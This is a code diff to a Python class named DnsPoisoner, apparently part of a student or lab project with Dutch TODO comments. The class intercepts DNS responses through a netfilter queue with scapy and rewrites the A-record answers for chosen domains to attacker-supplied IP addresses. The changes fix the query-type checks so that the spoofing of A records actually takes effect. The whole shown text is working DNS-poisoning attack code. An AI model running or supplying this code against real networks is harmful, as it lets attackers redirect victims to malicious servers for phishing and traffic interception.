@@ -22,7 +22,7 @@ class DnsPoisoner():
     def add_url(self, url, ip):
 
         url_pattern = re.compile(url.replace(".", "[.]").replace("*", ".*"))
-        self.urls_to_spoof[url_pattern] = ip # TODO regex toevoegen
+        self.urls_to_spoof[url_pattern] = ip
 
     def get_ip(self, url):
         
@@ -33,7 +33,7 @@ class DnsPoisoner():
     def handle_packet(self, packet_nfqueue):
         """Handles each packet in the queue by editing them if neccessary."""
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
-        
+
         if packet_scapy.haslayer(DNSRR):
             packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
             packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
@@ -47,7 +47,7 @@ class DnsPoisoner():
 
         if ip_to_spoof:
 
-            if packet[DNSQR].qtype == "A":
+            if packet[DNSQR].qtype == 1:
                 packet[DNSRR].rdata = ip_to_spoof
                 packet[DNS].ancount = 1
                 del(packet[IP].len)
@@ -55,7 +55,7 @@ class DnsPoisoner():
                 del(packet[UDP].len)
                 del(packet[UDP].chksum)
             
-            if packet[DNSQR].qtype == "AAAA":
+            elif packet[DNSQR].qtype == 28:
                 pass # TODO wat te doen met ipv6?
 
         return packet
